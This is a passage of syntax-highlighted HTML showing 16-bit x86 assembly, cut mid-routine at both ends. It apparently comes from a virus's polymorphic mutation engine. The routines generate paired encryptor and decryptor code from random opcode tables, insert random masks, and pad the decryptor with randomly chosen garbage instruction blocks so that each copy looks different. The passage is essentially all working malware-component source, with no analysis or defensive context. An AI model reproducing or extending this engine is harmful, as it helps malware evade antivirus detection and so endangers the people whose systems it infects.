                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get encryptor opcode</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc5">indexreg_op1</span><span class="sc0"> </span><span class="sc1">; Insert op register</span><span class="sc0">
                </span><span class="sc6">scasw</span><span class="sc0">                   </span><span class="sc1">; SI+2, DI+2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">           </span><span class="sc1">; Inst. needs a mask?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">get_inst_mask</span><span class="sc0">   </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add to encryptor</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Next encryptor entry</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">get_inst_mask</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; Get mask [0..0FEh]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">mask_dec_ofs</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">; Save current offsets</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">mask_enc_ofs</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Add mask to decryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add instruction to encryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Add mask to encryptor</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">encryptor_ptr</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">get_immaddr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">mask_dec_ofs</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Any mask instruction?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_mask_inst</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_endencryptor</span><span class="sc0">   </span><span class="sc1">; Add inst at end of encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Add instruction to decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; Add instruction to encryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">mask_dec_ofs</span><span class="sc0"> </span><span class="sc1">; Calculate mask address in decryptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">delta_ofs</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">enc_buffer</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Add address to instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">mask_enc_ofs</span><span class="sc0"> </span><span class="sc1">; Calculate mask address in encryptor</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Add to encryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..0FEh]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; Value for adding to the mask</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">ofs_endencryptor</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">   </span><span class="sc1">; New end of encryptor</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc2">0C3h</span><span class="sc0">    </span><span class="sc1">; Add a RET at end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">mask_dec_ofs</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">no_mask_inst</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">operation_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">         </span><span class="sc1">; xor byte ptr [index],??</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">         </span><span class="sc1">; xor byte ptr [index],??</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; add byte ptr [index],??</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">         </span><span class="sc1">; sub byte ptr [index],??</span><span class="sc0">
        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; rol byte ptr [index],??</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; ror byte ptr [index],??</span><span class="sc0">
        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; rol byte ptr [index],1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; ror byte ptr [index],1</span><span class="sc0">
        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">        </span><span class="sc1">; neg byte ptr [index]</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">        </span><span class="sc1">; neg byte ptr [index]</span><span class="sc0">
        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; inc byte ptr [index]</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; dec byte ptr [index]</span><span class="sc0">
        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; add byte ptr [imm],??</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">; add byte ptr [imm],??</span><span class="sc0">


</span><span class="sc5">generate_mov</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..3]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">mov_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">aad</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">; Select mov type</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Check if needs to use routine 1 or 0</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">mov_select</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mov_select</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">mov_r1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">mov_r2</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">mov_r1</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Generates: mov reg(dl),value(bp)</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Store instruction opcodes</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Set destination register</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store delta offset</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mov_r2</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Generates: (xor | sub) reg(dl),reg(dl)</span><span class="sc0">
                                </span><span class="sc1">;            (add | xor | or) reg(dl),value(bp)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; 0 or 1</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Select instruction (clear register)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">reg0_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Store instruction zero register</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Destination register</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Source reg. (same as destination)</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                   </span><span class="sc1">; Store instruction</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">       </span><span class="sc1">; Destination register</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store delta offset</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">generate_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">mov_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; Use mov_r1</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">       </span><span class="sc1">; MOV reg,imm</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Use mov_r2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">        </span><span class="sc1">; OR reg,imm</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Use mov_r2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">        </span><span class="sc1">; ADD reg,imm</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Use mov_r2</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">        </span><span class="sc1">; XOR reg,imm</span><span class="sc0">

</span><span class="sc5">reg0_table</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">29h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">        </span><span class="sc1">; SUB reg,reg</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">        </span><span class="sc1">; XOR reg,reg</span><span class="sc0">


</span><span class="sc5">get_garbage_number</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">max_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..max_garbage-1]</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     

</span><span class="sc5">generate_garbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">           </span><span class="sc1">; Generate garbage?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_garbage</span><span class="sc0">      </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_garbage</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">garbage_table</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">l_select_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">    </span><span class="sc1">; [0..1Eh]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">              </span><span class="sc1">; DL in [1..1Fh]</span><span class="sc0">
</span><span class="sc5">process_table_entry</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Read entry</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">          </span><span class="sc1">; End of table?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_entry</span><span class="sc0">     </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">garbage_table</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">process_table_entry</span><span class="sc0">

</span><span class="sc5">check_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; Get number of opcodes</span><span class="sc0">
                </span><span class="sc6">cbw</span><span class="sc0">                     </span><span class="sc1">; AH:=0 (b'cos AL&lt;80h)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">; Generate this instruction block?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">generate_block</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Calculate next table entry address :</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">           </span><span class="sc1">;  #opcodes + #patches + 2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">process_table_entry</span><span class="sc0">

</span><span class="sc5">generate_block</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; Sub instruction size from garbage</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">          </span><span class="sc1">; Instruction too big?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_select_entry</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp (don't generate)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">garbagetogen</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc1">; Remaining garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Read block flags</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">jmp_ofs</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">   </span><span class="sc1">; Allowed instruction? (don't allow</span><span class="sc0">
                                        </span><span class="sc1">;  cond.jmp inside another cond.jmp)</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">l_select_entry</span><span class="sc0">  </span><span class="sc1">; No? then jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; Can be in the decryptor loop?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">loop_ok</span><span class="sc0">         </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">in_loop</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Is in the loop?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">l_select_entry</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
</span><span class="sc5">loop_ok</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Get block probabilities</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_n_random</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">; Generate block?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">l_select_entry</span><span class="sc0">  </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">         </span><span class="sc1">; get # of patches</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; # of opcodes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">           </span><span class="sc1">; Generate block</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; # of patches</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">; Any patch?</span><span class="sc0">
                </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">done_patches</span><span class="sc0">    </span><span class="sc1">; No? then jmp</span><span class="sc0">
</span><span class="sc5">l_do_patches</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
